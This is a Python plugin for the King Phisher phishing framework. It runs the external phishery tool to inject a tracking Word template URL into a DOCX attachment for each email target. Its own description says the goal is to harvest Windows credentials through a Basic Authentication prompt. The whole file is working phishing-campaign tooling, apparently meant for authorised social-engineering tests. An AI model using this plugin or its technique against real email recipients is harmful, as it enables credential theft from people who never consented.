import os
import subprocess
import tempfile
import time

import king_phisher.client.gui_utilities as gui_utilities
import king_phisher.client.mailer as mailer
import king_phisher.client.plugins as plugins

class Plugin(plugins.ClientPlugin):
	authors = ['Spencer McIntyre']
	title = 'Phishery DOCX URL Injector'
	description = """
	Use Phishery to inject Word Document Template URLs into DOCX files. This can
	be used in conjunction with a server page that requries Basic Authentication
	to collect Windows credentials. Note that the King Phisher server needs to
	be configured with a proper, trusted SSL certificate for the user to be
	presented with the basic authentication prompt.

	Phishery homepage: https://github.com/ryhanson/phishery
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	options = [
		plugins.ClientOptionPath(
			'phishery_bin',
			'Path to the phishery binary',
			default='/usr/local/bin/phishery',
			display_name='Phishery Path',
			path_type='file-open'
		),
		plugins.ClientOptionPath(
			'target_file',
			'Path to the Word DOCX file to attach',
			display_name='Word DOCX Path',
			path_type='file-open'
		),
		plugins.ClientOptionPath(
			'output_file',
			'Path to save the Word DOCX file to attach',
			display_name='Output Path',
			path_type='file-save'
		)
	]
	req_min_version = '1.7.0'
	def initialize(self):
		mailer_tab = self.application.main_tabs['mailer']
		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
		self.signal_connect('send-precheck', self.signal_send_precheck, gobject=mailer_tab)
		self.signal_connect('send-target', self.signal_send_target, gobject=mailer_tab)
		self.signal_connect('send-finished', self.signal_send_finished, gobject=mailer_tab)
		return True

	def attach_file(self, outfile):
		self.application.config['mailer.attachment_file'] = outfile

	def build_file(self, target=None):
		url = self.application.config['mailer.webserver_url']
		if target is not None:
			url += '?id=' + target.uid
		proc_h = subprocess.Popen(
			[
				self.config['phishery_bin'],
				'-u',
				url,
				'-i',
				self.config['target_file'],
				'-o',
				self.config['output_file']
			],
			stdin=subprocess.PIPE,
			stdout=subprocess.PIPE
		)
		status = proc_h.wait()
		if status != 0:
			raise RuntimeError('phishery exited with non-zero status code')
		self.logger.info('wrote docx file to: ' + self.config['output_file'] + ('' if target is None else ' with uid: ' + target.uid))
		return True

	def missing_options(self):
		# return true if a required option is missing or otherwise invalid
		phishery_bin = self.config['phishery_bin']
		if not os.path.isfile(phishery_bin):
			return True
		if not os.access(phishery_bin, os.X_OK):
			return True
		target_file = self.config['target_file']
		if not os.path.isfile(target_file):
			return True
		if not os.access(target_file, os.R_OK):
			return True
		return False

	def signal_send_precheck(self, _):
		if self.missing_options():
			self.text_insert('One or more of the options required to use phishery are invalid.\n')
			return False
		return True

	def signal_send_target(self, _, target):
		self.build_file(target)
		self.attach_file(self.config['output_file'])

	def signal_send_finished(self, _):
		self.application.config['mailer.attachment_file'] = None
		if not os.access(self.config['output_file'], os.W_OK):
			return
		os.remove(self.config['output_file'])
